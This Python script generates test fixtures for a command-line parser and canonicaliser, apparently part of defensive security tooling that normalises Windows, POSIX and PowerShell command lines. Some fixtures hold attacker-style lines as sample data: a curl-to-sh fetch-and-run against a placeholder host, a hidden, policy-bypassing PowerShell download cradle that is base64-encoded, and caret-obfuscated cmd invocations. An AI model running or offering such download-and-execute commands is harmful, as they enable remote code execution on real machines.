"""Generate the cmdline-canon fixtures. Writers: subprocess.list2cmdline / shlex.join / pwsh UTF-16LE base64.
Readers (expected): mslex legacy (CommandLineToArgvW) split, shlex.split, pwsh FromBase64String. Never lib.codec.
Run: PYTHONPATH=tools/pylib python3 tests/data/script_fixtures/cmdline_canon_gen.py"""
import json, pathlib, shlex, subprocess, sys
import mslex

D = pathlib.Path(__file__).parent
PWSH = str(D.parents[2] / "bin" / "pwsh")


def ps(cmd):
    return subprocess.run([PWSH, "-NoProfile", "-NonInteractive", "-Command", cmd], capture_output=True, text=True,
                          timeout=60).stdout.rstrip("\r\n")


def enc(text):
    return ps("[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('%s'))" % text.replace("'", "''"))


def dec(b64):
    return ps("[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('%s'))" % b64)


def ws(s):
    return " ".join(s.split())


def put(name, **fx):
    (D / f"{name}.json").write_text(json.dumps(fx, indent=1, ensure_ascii=False) + "\n")


MS = "mslex.split(s, like_cmd=False, check=False, ucrt=False)  # legacy runtime = CommandLineToArgvW rules"
# 1. Windows argv: list2cmdline writer, mslex legacy reader
argv = ["C:\\Program Files\\App\\x.exe", 'say "hi"', "C:\\dir with space\\", "a\\\\b", "", "tail\\"]
s = subprocess.list2cmdline(argv)
put("cmdline_argv_win_list2cmdline", material=s, rep="cmdline", transform="argv",
    expected=json.dumps(mslex.split(s, like_cmd=False, check=False, ucrt=False), ensure_ascii=False),
    generator_cmd="python3 -c 'import subprocess; print(subprocess.list2cmdline(%r))'" % (argv,),
    oracle_cmd="PYTHONPATH=tools/pylib python3 -c 'import mslex,json,sys; s=sys.argv[1]; print(json.dumps(%s))' \"$S\"" % MS)
assert json.loads(json.dumps(mslex.split(s, like_cmd=False, check=False, ucrt=False))) == argv
# 2. Windows argv: doubled quote inside quotes (legacy: emit '"' and leave quote mode), odd backslashes
s = 'rundll32.exe "a""b c" d\\\\\\"e "f\\\\" g'
put("cmdline_argv_win_dblquote", material=s, rep="cmdline", transform="argv",
    expected=json.dumps(mslex.split(s, like_cmd=False, check=False, ucrt=False), ensure_ascii=False),
    generator_cmd="hand-written CommandLineToArgvW edge line: %s" % s,
    oracle_cmd="PYTHONPATH=tools/pylib python3 -c 'import mslex,json,sys; s=sys.argv[1]; print(json.dumps(%s))' \"$S\"" % MS)
# 3. POSIX argv: shlex.join writer, shlex.split reader
argv = ["/bin/sh", "-c", "curl -s 'http://x.invalid/a b' | sh", "it's", 'q"uote', "$HOME"]
s = shlex.join(argv) + " \"dq \\\"y\\\"\" back\\ slash"
put("cmdline_argv_posix_shlex", material=s, rep="cmdline", transform="argv_posix",
    expected=json.dumps(shlex.split(s), ensure_ascii=False),
    generator_cmd="python3 -c 'import shlex; print(shlex.join(%r))' + ' \"dq \\\\\"y\\\\\"\" back\\\\ slash'" % (argv,),
    oracle_cmd="python3 -c 'import shlex,json,sys; print(json.dumps(shlex.split(sys.argv[1])))' \"$S\"")
# 4. canon: powershell -enc (pwsh writes the UTF-16LE base64, pwsh decodes it back)
cmd = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')"
b = enc(cmd)
s = '"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.EXE" -NoP  -NonI -W Hidden -ExecutionPolicy ByPass -enc ' + b
put("cmdline_canon_ps_enc", material=s, rep="cmdline", transform="canon",
    expected="powershell -noprofile -noninteractive -windowstyle hidden -executionpolicy bypass -command " + ws(dec(b)),
    generator_cmd="pwsh -c \"[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\\"%s\\\"))\"" % cmd,
    oracle_cmd="pwsh -c \"[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('%s'))\"; prefix by the rules "
               "(image basename lower, .exe off; -NoP/-NonI/-W/-ExecutionPolicy -> full lower names, values lower; "
               "-enc -> -command <text>)" % b)
# 5. canon: %COMSPEC% /C with carets, glued "" and a nested -e payload; 8.3 + slash paths
cmd = "Start-Process notepad"
b = enc(cmd)
s = '%COMSPEC% /C "p^ow""ers^hell.exe -e ' + b + '"'
put("cmdline_canon_cmd_caret", material=s, rep="cmdline", transform="canon",
    expected="cmd /c powershell -command " + dec(b),
    generator_cmd="pwsh -c \"[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('%s'))\" -> %s" % (cmd, s),
    oracle_cmd="pwsh -c \"[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('%s'))\"; %%COMSPEC%% = cmd.exe, "
               "cmd removes ^ outside quotes and po\"\"wer -> power, /C -> /c, payload quotes stripped" % b)
s = '"C:/PROGRA~1/Common Files/Svc.EXE"  -k  "c:\\windows\\SYSTEM32\\drivers\\etc\\hosts"   $env:SystemRoot/Temp/X.dat'
put("cmdline_canon_paths", material=s, rep="cmdline", transform="canon",
    expected='svc -k C:\\Windows\\System32\\drivers\\etc\\hosts C:\\Windows\\Temp\\X.dat',
    generator_cmd="hand-written: %s" % s,
    oracle_cmd="pwsh -c \"[IO.Path]::GetFileNameWithoutExtension('C:/PROGRA~1/Common Files/Svc.EXE').ToLower()\" -> svc; "
               "system prefixes per the canon table (C:\\Windows\\System32\\, $env:SystemRoot = C:\\WINDOWS -> C:\\Windows), "
               "/ -> \\, arg case kept")
# 6. -enc whose value is NOT UTF-16LE base64: kept verbatim (no guessed text)
s = "powershell -enc notbase64!!"
put("cmdline_canon_ps_badenc", material=s, rep="cmdline", transform="canon",
    expected="powershell -encodedcommand notbase64!!",
    generator_cmd="hand-written: %s" % s,
    oracle_cmd="pwsh -c \"[Convert]::FromBase64String('notbase64!!')\" -> FormatException (not decodable, so the value stays)")
# 7. decoys: no image at all
put("cmdline_canon_decoy_empty", material='""', rep="cmdline", transform="canon", expected=None, decoy=True,
    generator_cmd="printf '\"\"'  (empty quoted image)",
    oracle_cmd="PYTHONPATH=tools/pylib python3 -c 'import mslex; print(mslex.split(\"\\\"\\\"\", like_cmd=False, check=False, ucrt=False))' -> [''] (no image)")
put("cmdline_argv_decoy_blank", material="   \t ", rep="cmdline", transform="canon", expected=None, decoy=True,
    generator_cmd="printf '   \\t '", oracle_cmd="python3 -c 'import shlex; print(shlex.split(\"   \\t \"))' -> [] (no command)")
print(ps("'pwsh ok'"))
